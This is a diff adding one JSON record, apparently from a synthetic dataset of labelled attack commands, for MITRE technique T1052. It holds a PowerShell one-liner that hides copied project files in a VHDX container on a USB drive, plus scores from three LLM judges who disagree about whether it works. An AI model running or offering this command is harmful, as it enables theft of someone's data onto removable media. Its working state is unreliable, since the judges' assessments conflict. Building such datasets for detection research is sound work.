@@ -1,0 +1,57 @@
+{
+  "technique_id": "T1052",
+  "platform": "Windows",
+  "shell": "Powershell",
+  "command": "$usb=(Get-Disk | Where-Object BusType -eq 'USB' | Select-Object -First 1); $drv=(Get-Partition -DiskNumber $usb.Number | Where-Object DriveLetter | Select-Object -First 1 -ExpandProperty DriveLetter); $vhd=\"$drv:\\System\\cache.vhdx\"; New-Item -Path (Split-Path $vhd) -ItemType Directory -Force | Out-Null; New-VHD -Path $vhd -SizeBytes 2147483648 -Dynamic | Out-Null; Mount-DiskImage -ImagePath $vhd; $v=(Get-DiskImage $vhd | Get-Disk | Get-Partition | Where-Object DriveLetter | Get-Volume | Select-Object -First 1 -ExpandProperty DriveLetter); Format-Volume -DriveLetter $v -FileSystem NTFS -Force -Confirm:$false | Out-Null; Copy-Item \"C:\\Projects\\*\" \"$v:\\\" -Recurse -Force; Dismount-DiskImage -ImagePath $vhd",
+  "explanation": "Creates and mounts a VHDX on the USB, formats it, copies project data inside, and dismounts, hiding exfil data within a single container file on removable media.",
+  "rationale_steps": [
+    "Find USB disk and determine its drive letter.",
+    "Create a VHDX file on the USB and mount it.",
+    "Format the mounted volume, copy data into it, then dismount to encapsulate data in the VHDX."
+  ],
+  "obfuscation_level": "none",
+  "id": "SYN-POWERSHELL-T1052-5d877001-63a6f7c0",
+  "source_prompt_hash": "5d877001",
+  "timestamp_utc": "2025-09-30T05:25:30.107478Z",
+  "validation": {
+    "syntax_ok": null,
+    "llm_judgments": [
+      {
+        "model": "gpt-5",
+        "syntactic_score": 4,
+        "syntactic_justification": "The command is well-formed and parseable with balanced quoting and separators, but uses Where-Object without a scriptblock or comparison (e.g., 'Where-Object DriveLetter'), which will cause parameter binding issues at runtime.",
+        "semantic_score": 3,
+        "semantic_justification": "It conceptually aligns with exfiltration to removable media via a VHDX container, but will likely fail without admin rights and missing disk initialization/partitioning steps for the new VHD, making successful formatting and copying unlikely.",
+        "combined_score": 3.5,
+        "confidence": 0.78,
+        "timestamp": "2025-10-01T09:52:08.663816Z"
+      },
+      {
+        "model": "claude-3-7-sonnet",
+        "syntactic_score": 5,
+        "syntactic_justification": "The PowerShell command is perfectly well-formed with proper variable assignments, balanced parentheses, correct cmdlet usage, appropriate piping, and proper semicolon separators between commands.",
+        "semantic_score": 5,
+        "semantic_justification": "The command fully implements the T1052 technique by identifying a USB device, creating a hidden VHDX container on it, copying project data into the container, and dismounting it - effectively exfiltrating data over physical media in a way that obscures the content.",
+        "combined_score": 5.0,
+        "confidence": 0.95,
+        "timestamp": "2025-10-01T09:52:11.830279Z"
+      },
+      {
+        "model": "gemini-2.0-flash-thinking-exp",
+        "syntactic_score": 5,
+        "syntactic_justification": "The command is perfectly well-formed with balanced parentheses, correct separators, and valid PowerShell cmdlet syntax and parameters.",
+        "semantic_score": 1,
+        "semantic_justification": "The command's core operations like `Get-Disk`, `New-VHD`, `Mount-DiskImage`, `Format-Volume`, and `Dismount-DiskImage` explicitly require administrator privileges, rendering the command operationally impossible under the stated 'Privilege: None' constraint.",
+        "combined_score": 3.0,
+        "confidence": 1,
+        "timestamp": "2025-10-01T09:52:28.396984Z"
+      }
+    ],
+    "llm_average_syntactic": 4.667,
+    "llm_average_semantic": 3.0,
+    "llm_average_score": 3.833,
+    "llm_verdict": "likely_match",
+    "sandbox_trace_id": null,
+    "mitre_match_score": null
+  }
+}
